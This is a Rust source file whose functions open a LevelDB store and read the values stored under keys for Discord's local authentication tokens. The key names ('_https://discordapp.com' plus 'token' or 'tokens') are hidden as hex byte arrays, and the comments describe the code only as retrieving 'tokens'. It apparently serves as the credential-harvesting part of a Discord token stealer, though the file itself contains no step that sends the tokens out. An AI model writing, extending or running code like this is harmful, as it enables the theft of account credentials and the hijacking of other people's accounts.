use std::{error::Error, path};

use rusty_leveldb::{Options, DB};

/// This function retrieves all tokens from the database
///
/// # Arguments
///
/// * `p` - A `PathBuf` that represents the path to the database
///
/// # Returns
///
/// * `Result<String, Box<dyn Error>>` - A `Result` that contains a `String` of all tokens or an error
pub fn get_tokens(p: path::PathBuf) -> Result<String, Box<dyn Error>> {
    let mut db = open_db(p)?;

    let dkey = db.get(&[0x5f, 0x68, 0x74, 0x74, 0x70, 0x73, 0x3a, 0x2f, 0x2f, 0x64, 0x69, 0x73, 0x63, 0x6f, 0x72, 0x64, 0x61, 0x70, 0x70, 0x2e, 0x63, 0x6f, 0x6d, 0x0, 0x1, 0x74, 0x6f, 0x6b, 0x65, 0x6e, 0x73]).ok_or::<Box<dyn Error>>("Key not found in database".into())?;
    let tokens = String::from_utf8(dkey.to_vec())?;
    db.close()?;
    Ok(tokens)
}

/// This function retrieves a single token from the database
///
/// # Arguments
///
/// * `p` - A `PathBuf` that represents the path to the database
///
/// # Returns
///
/// * `Result<String, Box<dyn Error>>` - A `Result` that contains a `String` of the token or an error
pub fn get_token(p: path::PathBuf) -> Result<String, Box<dyn Error>> {
    let mut db = open_db(p)?;

    let dkey = db.get(&[0x5f, 0x68, 0x74, 0x74, 0x70, 0x73, 0x3a, 0x2f, 0x2f, 0x64, 0x69, 0x73, 0x63, 0x6f, 0x72, 0x64, 0x61, 0x70, 0x70, 0x2e, 0x63, 0x6f, 0x6d, 0x0, 0x1, 0x74, 0x6f, 0x6b, 0x65, 0x6e]).ok_or::<Box<dyn Error>>("Key not found in database".into())?;
    let token = String::from_utf8(dkey.to_vec())?;
    db.close()?;
    Ok(token)
}

/// This function opens the database
///
/// # Arguments
///
/// * `p` - A `PathBuf` that represents the path to the database
///
/// # Returns
///
/// * `Result<DB, Box<dyn Error>>` - A `Result` that contains a `DB` or an error
fn open_db(p: path::PathBuf) -> Result<DB, Box<dyn Error>> {
    let mut opt = Options::default();
    opt.reuse_logs = false;
    opt.reuse_manifest = false;
    opt.compression_type = rusty_leveldb::CompressionType::CompressionSnappy;
    DB::open(p, opt).map_err(|e| format!("Error opening database: {}", e).into())
}
